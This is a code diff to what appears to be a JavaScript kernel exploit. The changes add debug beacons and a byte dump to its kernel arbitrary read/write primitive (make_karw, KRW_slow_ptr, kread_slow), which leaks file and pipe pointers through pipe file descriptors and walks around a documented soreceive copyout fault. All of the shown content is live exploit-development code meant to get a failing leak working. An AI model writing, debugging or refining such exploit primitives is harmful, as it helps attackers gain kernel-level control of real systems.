@@ -2536,8 +2536,8 @@ function KRW_slow_ptr(addr, what) {
             return v;
         }
         beacon("slow ptr " + what + (err ? " err=" + err.slice(0, 40)
-                                          : " bad=" + hex(v))
-               + " retry " + (i + 1));
+                                          : " bad=" + hex(v) + " raw=" + lastLeakBytes(8))
+               + " @" + hex(addr) + " retry " + (i + 1));
     }
     throw new Error("slow rw: " + what + " never returned a kernel pointer");
 }
@@ -2592,6 +2592,22 @@ function make_karw() {
 
     const mrf = KRW_slow_ptr(ST.fdt_ofiles + BigInt(ST.master_pipe[0]) * FILEDESCENT_SIZE, "mrf");
     const vrf = KRW_slow_ptr(ST.fdt_ofiles + BigInt(ST.victim_pipe[0]) * FILEDESCENT_SIZE, "vrf");
+
+    /* Report BOTH file pointers and the fds they came from before dereferencing
+     * either.
+     *
+     * A run died here with mrf/vrf/mrd all fine and vrd stuck at
+     * 0xa100000000000000 across all six retries — deterministic, so it is a
+     * real read of something, not race garbage. isKernelPtr(vrf) only proves
+     * vrf is canonical, not that it is a struct file: if the entry we read was
+     * stale or the wrong slot, *vrf is whatever that object holds and no amount
+     * of retrying changes it. The two pipes are created back to back, so their
+     * fds are adjacent and their file pointers normally come from the same
+     * allocation run — a vrf wildly unlike mrf is the tell. */
+    beacon("pipe files mfd=" + ST.master_pipe[0] + " vfd=" + ST.victim_pipe[0]
+           + " mrf=" + hex(mrf) + " vrf=" + hex(vrf)
+           + " delta=" + hex(vrf > mrf ? vrf - mrf : mrf - vrf));
+
     const mrd = KRW_slow_ptr(mrf, "mrd");
     const vrd = KRW_slow_ptr(vrf, "vrd");
     log("master_rpipe_data=" + hex(mrd) + " victim_rpipe_data=" + hex(vrd));
@@ -2947,7 +2963,27 @@ function kwrite_slow(addr, buf, size) {
 
 function KRW_slow_r64(addr) {
     const p = kread_slow(BigInt(addr), 8);
+    /* Keep the raw buffer so a rejected read can show its BYTES.
+     *
+     * "bad=0xa100000000000000" is not enough to act on: a one-byte copyout
+     * desync (the documented soreceive fault path), a 0x41 sentinel, an all-zero
+     * buffer and a genuinely wrong address all reduce to a single hex qword that
+     * looks equally wrong. The byte pattern separates them — 0x41 repeats say
+     * sentinel, a kernel pointer shifted by one or seven bytes says desync, and
+     * plausible non-pointer data says we read the wrong place. */
+    ST.lastLeak = p;
     return rd64at(p, 0x00);
+}
+
+// Hex dump of the last slow-read buffer, for failure beacons.
+function lastLeakBytes(n) {
+    if (!ST.lastLeak) return "?";
+    let s = "";
+    for (let i = 0; i < (n || 8); i++) {
+        const b = Number(rd8(ST.lastLeak, i)) & 0xff;
+        s += (b < 16 ? "0" : "") + b.toString(16);
+    }
+    return s;
 }
 
 function KRW_slow_write(dst, src, n) {
